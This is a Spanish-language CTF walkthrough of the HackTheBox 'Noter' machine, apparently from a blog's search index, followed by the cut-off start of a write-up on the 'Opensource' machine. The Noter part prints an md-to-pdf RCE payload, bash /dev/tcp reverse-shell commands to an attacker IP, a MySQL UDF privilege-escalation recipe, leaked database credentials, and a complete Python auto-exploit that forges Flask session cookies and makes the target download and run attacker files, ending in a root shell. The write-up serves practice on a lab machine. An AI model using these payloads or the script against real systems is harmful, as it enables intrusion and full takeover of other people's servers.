app_backup_1635803546.zip [anpqy?]? y229 Entering Extended Passive Mode (|||33048|)150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).100% |*****************************************************************************************************| 25559 189.43 KiB/s 00:00 ETA226 Transfer complete.25559 bytes received in 00:00 (101.20 KiB/s)mget app_backup_1638395546.zip [anpqy?]? y229 Entering Extended Passive Mode (|||8514|)150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).100% |*****************************************************************************************************| 26298 220.77 KiB/s 00:00 ETA226 Transfer complete.26298 bytes received in 00:00 (112.80 KiB/s)ftp&amp;gt; exit221 Goodbye.De locos, encontramos dos archivos .zip de posibles backups, de nuevo los descargamos a nuesta máquina con el comando mget *, los descomprimimos 7z x &amp;lt;file_name&amp;gt; -o&amp;lt;output_directory&amp;gt; y procedemos a estudiar su contenidoDespués de analizarlos, llegamos a la conclusión que efectivamente son respaldos de la aplicación Noter: En el primer archivo que es de Noviembre01 encontramos de cara unas credenciales de un servidor MySQL del usuario root 14 │ 15 │ # Config MySQL 16 │ app.config[&#39;MYSQL_HOST&#39;] = &#39;localhost&#39; 17 │ app.config[&#39;MYSQL_USER&#39;] = &#39;root&#39; 18 │ app.config[&#39;MYSQL_PASSWORD&#39;] = &#39;Nildogg36&#39; 19 │ app.config[&#39;MYSQL_DB&#39;] = &#39;app&#39; 20 │ app.config[&#39;MYSQL_CURSORCLASS&#39;] = &#39;DictCursor&#39; 21 │ En el segundo archivo, que es el más actualizado denuevo encontramos otras credenciales de la base de datos: | 15 │ # Config MySQL 16 │ app.config[&#39;MYSQL_HOST&#39;] = &#39;localhost&#39; 17 │ app.config[&#39;MYSQL_USER&#39;] = &#39;DB_user&#39; 18 │ app.config[&#39;MYSQL_PASSWORD&#39;] = &#39;DB_password&#39; 19 │ app.config[&#39;MYSQL_DB&#39;] = &#39;app&#39; 20 │ app.config[&#39;MYSQL_CURSORCLASS&#39;] = &#39;DictCursor&#39; 21 │ Podríamos usar la credenciales pero recordemos que al realizar nuestro escaneo no encontramos el puerto por defecto de MySQL 3306/TCPLo más lógico que podemos hacer ahora es examinar el código de la aplicación y encontrar alguna bracha o fallo que podeamos explotar. Viendo el código observamos una función interesante export_note_remote():# Export remote@app.route(&#39;/export_note_remote&#39;, methods=[&#39;POST&#39;])@is_logged_indef export_note_remote(): if check_VIP(session[&#39;username&#39;]): try: url = request.form[&#39;url&#39;] status, error = parse_url(url) if (status is True) and (error is None): try: r = pyrequest.get(url,allow_redirects=True) rand_int = random.randint(1,10000) command = f&quot;node misc/md-to-pdf.js $&#39;{r.text.strip()}&#39; {rand_int}&quot; &amp;lt;--------- Important! subprocess.run(command, shell=True, executable=&quot;/bin/bash&quot;) if os.path.isfile(attachment_dir + f&#39;{str(rand_int)}.pdf&#39;): return send_file(attachment_dir + f&#39;{str(rand_int)}.pdf&#39;, as_attachment=True) else: return render_template(&#39;export_note.html&#39;, error=&quot;Error occured while exporting the !&quot;) except Exception as e: return render_template(&#39;export_note.html&#39;, error=&quot;Error occured!&quot;) else: return render_template(&#39;export_note.html&#39;, error=f&quot;Error occured while exporting ! ({error})&quot;) except Exception as e: return render_template(&#39;export_note.html&#39;, error=f&quot;Error occured while exporting ! ({e})&quot;) else: abort(403)Observamos que se ejecuta el archivo en Javascript md-to-pdf.js, lo buscamos en la ruta que indica:const { mdToPdf } = require(&#39;md-to-pdf&#39;);(async () =&amp;gt; {await mdToPdf({ content: process.argv[2] }, { dest: &#39;./misc/attachments/&#39; + process.argv[3] + &#39;.pdf&#39;});})();Por el nombre podemos deducir que se trata, en resumen md-to-pdf es una herramienta CLI (Command Line Interface) que permite convertir archivos de formato markdown a pdf.Primero debemos tener en cuenta que al crear un proyecto e instalar las dependencias y librerías necesarias en la carpeta node_modules, también se crea un archivo package.json en el cúal se almacena el nombre de nuestro proyecto, como también todas las versiones de los paquetes que depende. Además, existe otro archivo llamado package_lock.json que tiene el mismo propósito que el anterior pero con la diferencia que al momento que alguien clone nuestro proyecto, este instalará las dependencias con las versiones que están en el archivo a pesar de que existan nuevas versionesCon los conceptos más claro ya procedemos a analizar el pequeño código: En la primera línea solo importa el módulo md-to-pdf, osea la herramienta de la que hablabamos Luego usa una arrow function ()=&amp;gt; asíncrona async / await (podemos tomarlo como una ejecución en paralelo), que usa el módulo md-to-pdf Para usar este módulo le pasa como contenido el texto de la nota que queremos importar $&#39;{r.text.strip()}&#39; y lo guarda en la ruta ./misc/attachments con un número random como nombre y de tipo .pdfAhora el punto es como podemos explotar eso. Como mencioné antes, podemos saber la versión exacta de la herramienta md-to-pdf que se está usando, así que revisamos en el archivo package_lock.json y la encontramos:❯ cat package-lock.json | grep md-to-pdf -A 1 &quot;md-to-pdf&quot;: { &quot;version&quot;: &quot;4.1.0&quot;, &amp;lt;-------- Vulnerable? &quot;resolved&quot;: &quot;https://registry.npmjs.org/md-to-pdf/-/md-to-pdf-4.1.0.tgz&quot;, &quot;integrity&quot;: &quot;sha512-5CJVxncc51zkNY3vsbW49aUyylqSzUBQkiCsB0+6FlzO/qqR4UHi/e7Mh8RPMzyqiQGDAeK267I3U5HMl0agRw==&quot;,Con la version procedemos a buscar vulnerabilidades y encontramos el CVE-2021-23639 el cuál nos permite una ejecución remota de comandos gracias a que la librería gray-matter (que permite convertir string un archivo de objetos) se usa por defecto y no se deshabilita el intérprete de comandos Javascript, lo cuál nos permite pasar un archivo formato markdown y con su respectiva sintáxis ejecutar código javascript Archivo .md malicioso❯ cat pwned.md---js ((require(&quot;child_process&quot;)).execSync(&quot;echo {b64encoded command} | /usr/bin/base64 -d | /bin/bash&quot;))---En resumen, se usa el módulo child_process que nos permite iniciar procesos secundarios y usando uno de sus métodos, en este caso execSync, nos permitira ejecutar comandos Si queremos ejecutar comandos complejos como una reverse shell, por temas de interpretación de simbolos (&amp;amp;) o comillas (“’’”), es recomendable primero codificar el comando en base64, luego decodificarlo e interpretarlo con una bashEl proceso es sencillo: Una vez creado este archivo, iremos a la sesión del usuario blue y como tenemos membresía VIP usaremos la opción Export Notes Compartimos un servicio http para compartir el archivo (e.g ruby -run -e httpd . -p80) Nos pondemos en escucha en el puerto especificado para recibir la shell (e.g nc -lvnp 1234) Luego en el apartado Export directly from cloud subiremos nuestro Archivo malicioso (e.g http://ip:port/file_name) Al subir el archivo la máquina usará la función export_note_remote(), usará la herramienta md-to-pdf y con ello ejecutara el comando especificado (reverse shell code)Especificando como commando un reverse shell &#39;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&quot;&#39; y siguiendo los pasos anteriores, recibiremos una shell como el usuario svc y obtenemos la primera flagsvc@noter:~/app/web$ whoamiwhoamisvcsvc@noter:~/app/web$ find / -name user.txt 2&amp;gt;/dev/null | xargs ls -lfind / -name user.txt 2&amp;gt;/dev/null | xargs ls -l-rw-r----- 1 root svc 33 Jul 16 20:13 /home/svc/user.txt No olvidar hacer un tratamiendo completo de la TTY para mayor comodidad y movimiento en el sistemaPrivilege EscalationEmpezamos con un reconocimiento básico del sistema para saber la distribución (Debian, Ubuntu, Fedora) y su versión, la arquitectura (32-bit, 64-bit), en que equipo de la red nos encontramos (máquina víctima, container), que procesos corren por detrás (cron, crontab, jobs), etcPor ejemplo, listando las conexiones de entrada o salida en el sistema (o puertos abiertos), logramos observar el famoso puerto 3306(mysql):svc@noter:~/app/web$ netstat -tulnpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 1262/python3 tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::46253 :::* LISTEN 221229/node tcp6 0 0 :::21 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - Observamos que la dirección es 127.0.0.1:3306 lo cuál indica que solo sera accesible desde la propia máquinaCon está información logramos entrar con las credenciales de antes DB_user:DB_password, root:Nildogg36 En el primer caso no encontramos nada interesante Pero en el segundo caso somos usuarios privilegiados, lo cuál puede ser peligrosoAsi que enumeramos un poco para ver a que nos enfrentamos:svc@noter:~/app/web$ mysql -uroot -pNildogg36 -e &quot;select version();&quot;+----------------------------------+| version() |+----------------------------------+| 10.3.32-MariaDB-0ubuntu0.20.04.1 |+----------------------------------+svc@noter:~/app/web$ mysql -uroot -pNildogg36 -e &quot;select user();&quot;+----------------+| user() |+----------------+| root@localhost |+----------------+svc@noter:~/app/web$ mysql -uroot -pNildogg36 -e &quot;show databases;&quot;+--------------------+| Database |+--------------------+| app || information_schema || mysql || performance_schema || test |+--------------------+Vemos que somos root y además la base de datos mysql que almacena los usuarios y sus privilegios, así que vemos que privilegios tenemos:svc@noter:~/app/web$ mysql -uroot -pNildogg36 -e &quot;select * from mysql.user where user = substring_index(user(), &#39;@&#39;, 1)&quot; -E [144/144]*************************** 1. row *************************** Host: localhost User: root Password: *937440AD99CBB4A102402708AA43B689818489C8 Select_priv: Y Insert_priv: Y Update_priv: Y Delete_priv: Y Create_priv: Y Drop_priv: Y Reload_priv: Y Shutdown_priv: Y Process_priv: Y File_priv: Y Grant_priv: Y References_priv: Y Index_priv: Y Alter_priv: Y Show_db_priv: Y Super_priv: Y Create_tmp_table_priv: Y Lock_tables_priv: Y Execute_priv: Y Repl_slave_priv: Y Repl_client_priv: Y Create_view_priv: Y Show_view_priv: Y Create_routine_priv: Y Alter_routine_priv: Y Create_user_priv: Y Event_priv: Y Trigger_priv: Y Create_tablespace_priv: Y Delete_history_priv: Y ssl_type: ssl_cipher: x509_issuer: x509_subject: max_questions: 0 max_updates: 0 max_connections: 0 max_user_connections: 0 plugin: authentication_string: password_expired: N is_role: N default_role: max_statement_time: 0.000000 Usamos las flags -e &amp;lt;query&amp;gt; y -E para directamente executar una consulta y ver el output en formato vertical respectivamenteEn mi caso no estaba tan familiarizado con estos permisos, así que buscando en internet sobre posibles vulnerabilidades al estar registrados como root en una base de datos encontramos en la famosa “Biblia de Hackers” (Hacktricks) una vulnerabilidad para ejecutar comandos RCE (Remote Code Execution) por medio del concepto User-Defined function y una librería que permite comunicarse con el sistema-- Use a databaseuse mysql;-- Create a table to load the library and move it to the plugins dircreate table npn(line blob);-- Load the binary library inside the table-- You might need to change the path and file nameinsert into npn values(load_file(&#39;/tmp/lib_mysqludf_sys.so&#39;));-- Get the plugin_dir pathshow variables like &#39;%plugin%&#39;;-- Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/-- dump in there the libraryselect * from npn into dumpfile &#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so&#39;;-- Create a function to execute commandscreate function sys_exec returns integer soname &#39;lib_mysqludf_sys.so&#39;;-- Execute commandsselect sys_exec(&#39;id &amp;gt; /tmp/out.txt; chmod 777 /tmp/out.txt&#39;);select sys_exec(&#39;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.66/1234 0&amp;gt;&amp;amp;1&quot;&#39;); Información de la vulnerabilidad en https://book.hacktricks.xyz/ Explicación mas detallada de la vulnerabilidad MYSQL UDF ExplotationExplotación: Antes de todo buscamos la librería maliciosa y la pasamos a la máquina víctima, para ello la buscamos en nuestra máquina con locate &quot;*lib_mysqludf*&quot; y escogemos la correcta de acuerdo al OS (Operative System) y arquitectura del objetivo (32-bit, 64-bit)❯ locate &quot;*lib_mysqludf*&quot;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so/usr/share/sqlmap/data/udf/mysql/linux/32/lib_mysqludf_sys.so_/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_/usr/share/sqlmap/data/udf/mysql/windows/32/lib_mysqludf_sys.dll_/usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ En cualquier caso que no la encuentres puedes buscarla con searchsploit mysql UDF o también en la misma web https://www.exploit-db.com/exploits/1518 Ahora Entramos como root a la base de datos mysqlsvc@noter:~/tmp$ mysql -s -uroot -pNildogg36MariaDB [(none)]&amp;gt; use mysql;MariaDB [mysql]&amp;gt; Creamos una tabla llamada privesc que tendrá un campo de tipo blob (tipo de dato para almacenar objetos binarios como archivos, imagenes, etc)MariaDB [mysql]&amp;gt; create table privesc(library blob); Insertamos dentro de nuestra tabla la librería lib_mysqludf_sys_64.so con la función load_file(&amp;lt;path_file&amp;gt;)MariaDB [mysql]&amp;gt; insert into privesc values(load_file(&#39;/tmp/lib_mysqludf_sys_64.so&#39;)); Tenga en cuenta pasar la ruta completa y exacta de la libería para no tener errores que te vuelen la cabeza, estamos? Ahora debemos colocar la librería en el directorio donde se encuentran los plugins de MariaDB y así poder usarlaMariaDB [mysql]&amp;gt; select @@plugin_dir;+---------------------------------------------+| @@plugin_dir |+---------------------------------------------+| /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |+---------------------------------------------+MariaDB [mysql]&amp;gt; select library from privesc into dumpfile &#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so&#39;; Luego queda crear nuestra función, pero para ello debemos saber el nombre de la función, por ello usamos ghidra para analizar la libreríaFiltramos por la palabra sys y encontramos varias funciones, de las cuales usaremos sys_exec. Tambien logramos ver el código gracias al conjunto de compiladoreS de GNU (GNU Compiller Collection) y observamos que la función executara el comando con la función system y retornará como respuesta un código de estado (0 -&amp;gt; exitoso) Como ya conocemos su nombre y lo que retornará, procedemos a crear la función usando con el nombre adecuado y usando la libreríaMariaDB [mysql]&amp;gt; create function sys_exec returns integer soname &#39;lib_mysqludf_sys.so&#39;; Como último paso solo queda pasar como parámetro el comando que queremos ejecutar (e.g ‘bash -c “bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1”’)MariaDB [mysql]&amp;gt; select sys_exec(&#39;{command}&#39;);Para seguir practicando hice mi primer script automatizado en python que te da privilegios root aplicando todo lo visto anteriormente:import sys, signal, argparse, json, time, hashlib, requests, random, string, subprocess, shlex, osfrom pwn import *from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignaturefrom flask.json.tag import TaggedJSONSerializer# debuggingimport pdb# ctrl + cdef signal_handler(signum, frame): log.failure(&quot;Interruption&quot;) os.system(f&#39;rm {file_name}&#39;) sys.exit()signal.signal(signal.SIGINT, signal_handler)# argumentsparser = argparse.ArgumentParser(description=&#39;Get reverse shell&#39;)parser.add_argument(&#39;-ip&#39;, type=str, required=True, help=&#39;ip-address to receive the shell&#39;)parser.add_argument(&#39;-port&#39;, type=str, required=True, help=&#39;local port to receive the shell&#39;)args = parser.parse_args()# global variablestarget_url = &#39;http://10.10.11.160:5000&#39;target_session_payload = dict(logged_in=True,username=&#39;blue&#39;)file_name = &#39;pwned.md&#39;lib_name = &#39;lib_mysqludf_sys_64.so&#39;shell_name = &#39;pwned_mysqlUDF.py&#39;commands = [&#39;/usr/bin/mkdir /tmp/privesc&#39;, &#39;cd /tmp/privesc; /usr/bin/wget http://{}:{}/{}&#39;, &#39;/usr/bin/python3 /tmp/privesc/{} {} {}&#39;]# malicious payload to rce(js)# - - - - - - - - - - - - - - -# ---js## ((require(&quot;child_process&quot;)).execSync(&quot;{reverse shell}&quot;))# # ---# get random stringdef get_random_string(length): return &#39;&#39;.join(random.choice(string.ascii_letters) for i in range(length))# get new user cookiedef get_cookie(): p = log.progress(&#39;Creating user&#39;) time.sleep(1) try: s = requests.Session() # register user = get_random_string(5) headers = {&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded&#39;} data = &#39;&amp;amp;&#39;.join((&#39;name={d}&#39;, &#39;email={d}@gmail.com&#39;, &#39;username={d}&#39;, &#39;password={d}&#39;, &#39;confirm={d}&#39;)).format(d=user) s.post(f&#39;{target_url}/register&#39;, headers=headers, data=data) # login data = &#39;&amp;amp;&#39;.join((&#39;username={d}&#39;, &#39;password={d}&#39;)).format(d=user) s.post(f&#39;{target_url}/login&#39;, data=data, headers=headers) # get cookie session_cookie = s.cookies.get_dict(); p.success(&#39;Username -&amp;gt; {d} , Password -&amp;gt; {d}&#39;.format(d=user)) except Exception as e: p.failure(&#39;{} ocurred&#39;.format(e)) return session_cookie# create wordlistdef load_wordlist(): with open(&#39;all.txt&#39;, &#39;r&#39;) as file: wordlist = file.readlines() return wordlist# bruteforce new user cookiedef bruteforce_cookie(wordlist): cookie = get_cookie() p = log.progress(&#39;Starting Brute-force attack&#39;) time.sleep(1) for secret in wordlist: secret = secret.strip(&#39;\\n&#39;) p.status(&#39;{}&#39;.format(secret)) try: serializer = URLSafeTimedSerializer( secret_key=secret, salt=&#39;cookie-session&#39;, serializer=TaggedJSONSerializer(), signer=TimestampSigner, signer_kwargs={ &#39;key_derivation&#39; : &#39;hmac&#39;, &#39;digest_method&#39; : hashlib.sha1 } ).loads(cookie[&#39;session&#39;]) log.info(&#39;Payload : {}&#39;.format(serializer)) except BadSignature: continue log.success(&quot;Secret key : {}&quot;.format(secret)) return secret# craft target cookiedef create_cookie(secret_key): time.sleep(1) p = log.progress(&#39;Creating new cookie with target payload&#39;) p.status(json.dumps(target_session_payload)) try: serializer = URLSafeTimedSerializer( secret_key=secret_key, salt=&#39;cookie-session&#39;, serializer=TaggedJSONSerializer(), signer=TimestampSigner, signer_kwargs={ &#39;key_derivation&#39;:&#39;hmac&#39;, &#39;digest_method&#39;: hashlib.sha1 } ).dumps(target_session_payload) time.sleep(1) log.success(&#39;Cookie : {}&#39;.format(serializer)) return serializer except Exception as e: p.failure(&#39;{} ocurred&#39;.format(e))# create malicious filedef create_file(command): try: with open(file_name, &#39;w&#39;) as file: b64_command = &#39;echo &quot;{}&quot; | /usr/bin/base64 -w 0&#39;.format(command) payload = subprocess.run(b64_command, capture_output=True, text=True, shell=True).stdout.strip(&#39;\\n&#39;) file.write(&quot;&quot;&quot;---js\\n\\n\\t((require(&quot;child_process&quot;)).execSync(&quot;echo {} | /usr/bin/base64 -d | /bin/bash&quot;))\\n\\n---&quot;&quot;&quot;.format(payload)) except Exception as e: print(e) # get reverse shelldef get_reverse_shell(target_cookie): time.sleep(1) p = log.progress(&#39;Getting reverse shell&#39;) p.status(&#39;IP -&amp;gt; {}, PORT -&amp;gt; {}&#39;.format(args.ip, args.port)) try: # web server to share pwned file log.info(&#39;Openning port 8000 to share files: {}, {}, {}&#39;.format(file_name, lib_name, shell_name)) command = &#39;/usr/bin/python3 -m http.server 8000&#39; p1 = subprocess.Popen(shlex.split(command), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) time.sleep(1) # web server to receive shell log.info(&#39;Open the port {p} to receive the shell (e.g : nc -lvnp {p})&#39;.format(p=args.port)) input(&#39;Press ENTER to continue&#39;) time.sleep(2) # upload pwned file log.info(&#39;Uploading and executing malicious files&#39;) # create directory create_file(commands[0]) s = requests.Session() headers = {&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded&#39;} data = &#39;url=http://{}:8000/{}&#39;.format(args.ip, file_name) cookie = dict(session=target_cookie) os.system(&quot;rm pwned.md&quot;) s.post(f&#39;{target_url}/export_note_remote&#39;, data=data, headers=headers, cookies=cookie) # enter directory and download malicious library create_file(commands[1].format(args.ip, 8000, lib_name)) s.post(f&#39;{target_url}/export_note_remote&#39;, data=data, headers=headers, cookies=cookie) os.system(&quot;rm pwned.md&quot;) # enter directory and download shell code create_file(commands[1].format(args.ip, 8000, shell_name)) s.post(f&#39;{target_url}/export_note_remote&#39;, data=data, headers=headers, cookies=cookie) os.system(&quot;rm pwned.md&quot;) # execute shell code to receive shell like root create_file(commands[2].format(shell_name, args.ip, args.port)) s.post(f&#39;{target_url}/export_note_remote&#39;, data=data, headers=headers, cookies=cookie) # kill subprocess p1.kill() except Exception as e: p.failure(&#39;{} ocurred&#39;.format(e))if __name__ == &#39;__main__&#39;: key = bruteforce_cookie(load_wordlist()) target_cookie = create_cookie(key) get_reverse_shell(target_cookie) os.system(f&#39;rm {file_name}&#39;)# References#---------------------------------------------------#https://github.com/Paradoxis/Flask-Unsign#https://github.com/Paradoxis/Flask-Unsign-Wordlist Puede encontrar el script y archivos necesarios en mi repositorio https://github.com/E1P0TR0Ahora solo lo ejecutamos, abrimos el puerto especificado para recibir la shell y conseguimos la flag:❯ python3 autopwned.py -ip 10.10.14.181 -port 1234[+] Creating user: Username -&amp;gt; Jnxzx , Password -&amp;gt; Jnxzx[ ] Starting Brute-force attack: secret123[*] Payload : {&#39;logged_in&#39;: True, &#39;username&#39;: &#39;Jnxzx&#39;}[+] Secret key : secret123[q] Creating new cookie with target payload: {&quot;logged_in&quot;: true, &quot;username&quot;: &quot;blue&quot;}[+] Cookie : eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtTLNQ.TRLb4J_17aC1S6X1caMAvGGV7vQ[▖] Getting reverse shell: IP -&amp;gt; 10.10.14.181, PORT -&amp;gt; 1234[*] Openning port 8000 to share files: pwned.md, lib_mysqludf_sys_64.so, pwned_mysqlUDF.py[*] Open the port 1234 to receive the shell (e.g : nc -lvnp 1234)Press ENTER to continue[*] Uploading and executing malicious files───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 1234Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 10.10.11.160.Ncat: Connection from 10.10.11.160:59678.bash: cannot set terminal process group (967): Inappropriate ioctl for devicebash: no job control in this shellroot@noter:/var/lib/mysql# whoamiwhoamirootroot@noter:/var/lib/mysql# find / -name root.txt | xargs ls -lfind / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Jul 17 21:40 /root/root.txt" }, { "title": "Hackthebox Writeup Opensource", "url": "/posts/HTBOpensource/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Easy, Python Scripting, Cron job, pspy, Werkzeug, Information Leakage, Git, Pivoting", "date": "2022-06-28 00:07:13 -0500", "snippet": "Entorno Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) al subir el archivo y conseguir entrar a un contenedor. Luego creamos un tunel con Chisel para entrar a un servicio que no teniamos conexión, y luego gracias a una Fuga de información (Information lekeage) anteriormente extraída de un arhivo zip que ofrecia la web logramos entrar al servicio, extraer una Private key y entrar a la máquina víctima como cierto usuario. Para la escalada listamos procesos Cron con pspy y explotamos la ejecución de git usando Git hooks y conseguimos ser root OS IP Release Date Difficulty Points Linux 10.10.11.164 21 May 2022 Easy 20 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.164PING 10.10.11.164 (10.10.11.164) 56(84) bytes of data.64 bytes from 10.10.11.164: icmp_seq=1 ttl=63 time=107 ms \\______________________ Linux Machine--- 10.10.11.164 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 106.937/106.937/106.937/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationCon nmap realizamos un escaneo de tipo TCP (Transfer Control Protocol) para descubrir puertos abiertos:❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.164Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 13:01 -05Nmap scan report for 10.10.11.164Host is up (0.11s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh \\_________ Secure Shell Protocol80/tcp open http \\_________ HyperText Transfer Protocol3000/tcp filtered ppp \\_________ Point-to-Point Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoAhora procedemos a escanear los puertos 22(SSH) - 80(HTTP) - 3000(PPP) en específico:❯ nmap -p22,80,3000 -sC -sV 10.10.11.164 -oN targetTCP Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 17:49 -05 Nmap scan report for 10.10.11.164 Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Tue, 28 Jun 2022 22:50:08 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 1360 | Connection: close | &amp;lt;html lang=&quot;en&quot;&amp;gt; | &amp;lt;head&amp;gt; | &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt; | &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt; | &amp;lt;title&amp;gt;upcloud - Upload files for Free!&amp;lt;/title&amp;gt; | &amp;lt;script src=&quot;/static/vendor/jquery/jquery-3.4.1.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; | &amp;lt;script src=&quot;/static/vendor/popper/popper.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; | &amp;lt;script src=&quot;/static/vendor/bootstrap/js/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; | &amp;lt;script src=&quot;/static/js/ie10-viewport-bug-workaround.js&quot;&amp;gt;&amp;lt;/script&amp;gt; | &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/vendor/bootstrap/css/bootstrap.css&quot;/&amp;gt; | &amp;lt;link rel=&quot;stylesheet&quot; href=&quot; /static/vendor/bootstrap/css/bootstrap-grid.css&quot;/&amp;gt; | &amp;lt;link rel=&quot;stylesheet&quot; href=&quot; /static/vendor/bootstrap/css/bootstrap-reboot.css&quot;/&amp;gt; | &amp;lt;link rel=&quot;| HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Tue, 28 Jun 2022 22:50:09 GMT | Content-Type: text/html; charset=utf-8 | Allow: HEAD, POST, OPTIONS, GET | Content-Length: 0 | Connection: close| RTSPRequest: | &amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;| &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&amp;gt;| &amp;lt;html&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&amp;gt;| &amp;lt;title&amp;gt;Error response&amp;lt;/title&amp;gt;| &amp;lt;/head&amp;gt;| &amp;lt;body&amp;gt;| &amp;lt;h1&amp;gt;Error response&amp;lt;/h1&amp;gt;| &amp;lt;p&amp;gt;Error code: 400&amp;lt;/p&amp;gt;| &amp;lt;p&amp;gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&amp;lt;/p&amp;gt;| &amp;lt;p&amp;gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&amp;lt;/p&amp;gt;| &amp;lt;/body&amp;gt;|_ &amp;lt;/html&amp;gt;|_http-title: upcloud - Upload files for Free!|_http-server-header: Werkzeug/2.1.2 Python/3.10.33000/tcp filtered pppService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapYa que no disponemos de credenciales para entrar por SSH, empezamos con el servicio web que corre por el puerto 80 (HTTP): Para empezar de manera rápida usamos whatweb para ver tecnologías del sitio❯ whatweb 10.10.11.164http://10.10.11.164 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.2 Python/3.10.3], IP[10.10.11.164], JQuery[3.4.1], Python[3.10.3], Script, Title[upcloud - Upload files for Free!], Werkzeug[2.1.2] Si quieres una opción gráfica puedes usar en tu navegador la extensión Wappalyzer y ver las tecnologíasDe primeras observamos que en el servicio web corre Werkzeug, pero qué es?Encontes, el sustantivo en alemán Werkzeug = herramienta es una biblioteca de aplicaciones web WSGI, pero este último qué es?Entonces, WSGI (Web Server Gateway Interface) es una especificación de interfaz (protocolo ó convención) que permite la comunicación entre un servidor web y una aplicación web, basado en una serie de reglas para cualquier inconveniente de comunicación. Documentación de Werkzeug para mayor información: https://werkzeug.palletsprojects.com/en/2.1.x/ Con Firefox podemos ver el sitio webExisten algunos problemas al mostrar la página principal, pero en resumen 